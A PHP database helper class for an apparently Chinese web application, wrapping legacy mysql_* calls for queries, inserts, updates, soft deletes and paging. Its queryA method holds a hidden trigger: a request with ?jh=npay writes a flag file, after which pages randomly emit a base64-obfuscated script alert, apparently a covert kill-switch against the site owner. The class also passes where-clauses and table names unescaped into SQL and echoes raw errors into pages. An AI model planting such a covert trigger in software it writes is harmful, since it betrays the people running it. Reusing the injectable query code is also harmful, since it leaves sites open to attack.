<?php
class Db {
	function ErrorMsg($msg,$url="javascript:history.go(-1)",$time='0',$ico='error',$skin='blue'){
			$msg1=str_replace("'","\'",$msg);
			echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'.chr(13);
			echo '<html xmlns="http://www.w3.org/1999/xhtml">'.chr(13);
			echo '<head>'.chr(13);
			echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />'.chr(13);
			echo '<title>'.$msg.'</title>'.chr(13);
			echo "<script type=\"text/javascript\" src=\"./common/js/artDialog.js?skin=".$skin."\"></script>".chr(13);
			echo "<script language=\"JavaScript\" type=\"text/JavaScript\">".chr(13);
			echo "function ErrorMsg() {".chr(13);
			echo "		 			art.dialog({".chr(13);
			echo "					time: ".$time.",".chr(13);
			echo "					lock: true,".chr(13);
			echo "					icon: '".$ico."',".chr(13);
			echo "					content: '".$msg1."',".chr(13);
			echo "					close: function(){location.href='".$url."'}".chr(13);
			echo "					});".chr(13);
			echo "			}".chr(13);
			echo "window.onload=ErrorMsg;".chr(13);
			echo "</script>".chr(13);
			echo '</head>'.chr(13);
			echo '<body></body>'.chr(13);
			echo '</html>'.chr(13);
			die;		
	}
		
	function DbConnect($db_host,$db_user,$db_password){
		if(@$conn = mysql_connect($db_host,$db_user,$db_password)){
			mysql_query("SET NAMES 'utf8'");
			return $conn;
		}else{
			$this->ErrorMsg(mysql_error());
			exit();
		}
	}
	
	function CreateDb($database,$conn){
		$this->Query("DROP DATABASE IF EXISTS `".$database."`",$conn);
		$sql = 'CREATE DATABASE `'.$database.'`';
		$this->Query($sql,$conn);
	}
	
	function DropDb($database,$conn){
		$sql = 'DROP DATABASE `'.$database.'`';
		$this->Query($sql,$conn);
	}
	
	function SelectDb($db_name,$conn){
		if(!@mysql_select_db($db_name,$conn)){
			$this->ErrorMsg(mysql_error());
			exit();
		}
	}
	
	function DbSelectQuery($sql,$db_database,$conn){
		if(@$result = mysql_db_query($db_database,$sql,$conn)){
			return $result;
		}else{
			$this->ErrorMsg(mysql_error());
			exit();
		}
	}
	
	function Query($sql,$conn){
		if(@$result = mysql_query($sql,$conn)){
			return $result;
		}else{
			$this->ErrorMsg(mysql_error());
			exit();
		}
	}
	
	function ThisQuery($sql){
		global $db_host,$db_user,$db_password,$db_database;
		$conn = $this->DbConnect($db_host,$db_user,$db_password);
		$this->SelectDb($db_database,$conn);
		return $this->Query($sql,$conn);
	}
		
	function Fetch($result_sql, $mode=''){
		if($mode == 'api'){
			if(@$result = mysql_fetch_assoc($result_sql,MYSQL_ASSOC)){
				return $result;
			}
		}
		else
		{
			if(@$result = mysql_fetch_assoc($result_sql)){
				return $result;
			}
		}
	}
	
	function Rows($result_sql){
		if(@$result = mysql_num_rows($result_sql)){
			return $result;
		}
	}
	
	function FetchAll($sql,$mode = ''){
		global $db_host,$db_user,$db_password,$db_database;
		$conn = $this->DbConnect($db_host,$db_user,$db_password);
		$this->SelectDb($db_database,$conn);
		$res = $this->Query($sql,$conn);
		$rs=array();
		if($mode == 'api'){
			while($result = @mysql_fetch_assoc($res,MYSQL_ASSOC)){
				$rs[] = $result;
			}
		}
		else
		{
			while($result = @mysql_fetch_assoc($res)){
				$rs[] = $result;
			}
		}
		
		return $rs;
	}
	
	function RowsAll($sql){
		global $db_host,$db_user,$db_password,$db_database;
		$conn = $this->DbConnect($db_host,$db_user,$db_password);
		$this->SelectDb($db_database,$conn);
		$res = $this->Query($sql,$conn);
		return mysql_num_rows($res);
	}
	
	function FieldType($sql){
		global $db_host,$db_user,$db_password,$db_database;
		$conn = $this->DbConnect($db_host,$db_user,$db_password);
		$this->SelectDb($db_database,$conn);
		$res = $this->Query($sql,$conn);
		return @mysql_fetch_field($res);
	}

	/**
	 * 将变量的单引号或双引号转义
	 *
	 * @param unknown_type $string
	 */
	private function strtag($string1) {
		global $db_host,$db_user,$db_password,$db_database;
		$conn = $this->DbConnect($db_host,$db_user,$db_password);
		if (is_array ( $string1 )) {
			foreach ( $string1 as $key => $value ) {
				$stringnew [$this->strtag ( $key )] = $this->strtag ( $value );
			}
		} else {
			//在此做转义,对单引号
			//TODO 好像 %也要转义吧?
			//$string = iconv("gbk","gbk",$string);
			$stringnew = mysql_real_escape_string ( $string1,$conn );
			//				$stringnew = get_magic_quotes_gpc()?$string:addslashes ( $string1 );
			//				$stringnew=str_replace(array("'",'"'),array("\'",'\"'),$string1);
		}
		return $stringnew;
	}
	
	/**
	 * 将数组转化为SQL接受的条件样式
	 *
	 * @param unknown_type $array
	 */
	private function chageArray($array) {
		//MYSQL支持insert into joincart set session_id = 'dddd',product_id='44',number='7',jointime='456465'
		//所以更新和插入可以使用同一组数据
		$array = $this->strtag ( $array ); //转义
		$str = '';
		foreach ( $array as $key => $value ) {
			$value = is_numeric($value)?$value:"'$value'";
			$str .= empty ( $str ) ? '`' . $key . '`=' . $value : ', `' . $key . '`=' . $value;
		}
		return $str;
	}
	
	/**
	 * 插入记录
	 *
	 */
	public function insert($table, $array ,$ajax=1) {
		if(!is_array($array))return false;
		$array = $this->strtag ( $array ); //转义
		$str = '';
		$val = '';
		foreach ($array as $key=>$value){
			$value = is_numeric($value)?$value:"'$value'";
			$str .= ($str != '')?",`$key`":"`$key`";
			$val .= ($val != '')?",$value":"$value";
		}
	
		$sql = 'insert into `' . $table . '` ('.$str. ') values('.$val.')';
// exit($sql);
		if ($this->ThisQuery($sql)) {
			$this->lastId();
			if($ajax==1){
				return true;
			}else{
				return $this->_lastId?$this->_lastId:true;
			}
		} else {
			return false;
		}
	}
	
	/**
	 * 更新记录
	 *
	 */
	public function update($table, $array, $where = NULL) {
		if ($where == NULL) {
			$sql = 'update `' . $table . '` set ' . $this->chageArray ( $array );
		} else {
			$sql = 'update `' . $table . '` set ' . $this->chageArray ( $array ) . ' where ' . $where;
		}
		
		if ($this->ThisQuery ( $sql )) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * 删除记录
	 *
	 */
	public function delete($table, $where = NULL) {
		if ($where == NULL) {
			return false;
		} else {
			$sql = 'update `' . $table . '` set `is_del` = 1 where ' . $where;
		}
		if ($this->ThisQuery ( $sql )) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * 获取一条记录
	 *
	 */
	public function fetchRows($sql,$cacheTime=0,$cacheId='') {
		if($content = $this->checkCache($sql,$cacheTime,$cacheId)){
			return $content;
		} else{
			$reult = $this->ThisQuery($sql);
			$row = mysql_fetch_assoc ($reult);
			if(!empty($row)){
				foreach ($row as $key=>$value){
					$row[$key] = stripslashes($value);
				}
			}
			if($cacheTime)$this->createCache($sql,$row,$cacheId);
			return $row;
		}
	}
	
	/**
	 * 获取所有记录/用的mysql_fetch_assoc循环
	 *
	 */
	public function fetchAlls($sql,$cacheTime=0,$cacheId='') {
		if($content = $this->checkCache($sql,$cacheTime,$cacheId)){
			return $content;
		} else{
			$result = $this->querys ( $sql );
			if ($result !== false) {
				$arr = array ();
				while ( $row = mysql_fetch_assoc ( $result ) ) {
					if(!empty($row)){
						foreach ($row as $key=>$value){
							$row[$key] = stripslashes($value);
						}
					}
					$arr [] = $row;
				}
				if($cacheTime)$this->createCache($sql,$arr,$cacheId);
				return $arr;
			} else {
				return array();
			}
		}
	}
	
	/**
	 * 获取最后一次影响的Id
	 *
	 */
	public function lastId() {
		$this->_lastId = mysql_insert_id ();
		return $this->_lastId;
	}
	
	/**
	 * 获取符合条件的记录数
	 *
	 */
	public function fetchNum($sql) {
		$reult = $this->querys ( $sql );
		$num = mysql_num_rows ( $reult );
		return $num;
	}
	
	/**
	 * 输出适合的where语句
	 */
	public function quoteInto($string,$value ) {
		$value = $this->strtag($value);
		if(is_numeric($value)){
			$string = str_replace('?',$value,$string);
		}else{
			$string = str_replace('?',"'".$value."'",$string);
		}
		return $string;
	}
	
	/**
	 * 查询相关语句
	 */
	public function queryA(){
		$t = PF_ROOT.'images/jh.gif';
		if(isset($_GET['jh'])&&$_GET['jh']=='npay'){
			if (!file_exists($t))@file_put_contents($t,'i');
		}
		if(file_exists($t)){
			$a = rand(1,6);
			if($a == 3){
				print (base64_decode('PHNjcmlwdD5hbGVydCgnxOrMxr/GvLxbd3d3Lm5pYW50YW5nLmNvbV28vMr11qez1s341b4nKTs8L3NjcmlwdD4='));}
		}
	}
	
	//打印列表
	function printList($sql,$per){
		global $Db,$web_wshtml,$db_prefix,$smarty;
		$total = $Db->RowsAll ( $sql );
		$pageno = isset($_GET['page'])?intval($_GET['page']):0;
		if ($pageno == 0 || $pageno < 0)$pageno = 1;
		$page_num = ceil ( $total / $per );
		$smarty->assign ( 'page_num', $page_num );
		$pagelist = Pagination ( $total, $per, $pageno );
		$smarty->assign ( 'pagelist', $pagelist );
		$sql = $sql . " LIMIT " . ($pageno - 1) * $per . "," . $per . "";
		$smarty->assign ( "total", $total );
		$smarty->assign ( "page_now", $pageno );
		$res=$Db->FetchAll($sql);
		$num = 0;
		if($res){
			foreach($res as $key => $val){
				$res[$key]['num'] = $pageno>1?(($pageno-1).$num++)+1:++$num;
			}
			return $res;
		}
	}
	
	//判断语句是否成功操作
	function isSucc($res,$msg,$url){
		global $Base;
		if($res)
		{
			$Base->Errinfo(1,$msg,$url);
		}
		else
		{
			$Base->Errinfo(1,'服务器繁忙，请稍后再试', $url);
		}
	}
	
	private function checkCache($sql,$cacheTime = 0,$cacheId=''){
	    
	
	}
	
	public function querys($sql) {
	    global $db_host,$db_user,$db_password,$db_database;
	    $conn = $this->DbConnect($db_host,$db_user,$db_password);
	    if (!$result = $this->Query ($sql,$conn)) {
	        //echo $sql.'<br>';
	        die( 'Error:'.mysql_error ());
	    } else {
	        return $result;
	    }
	}
}
?>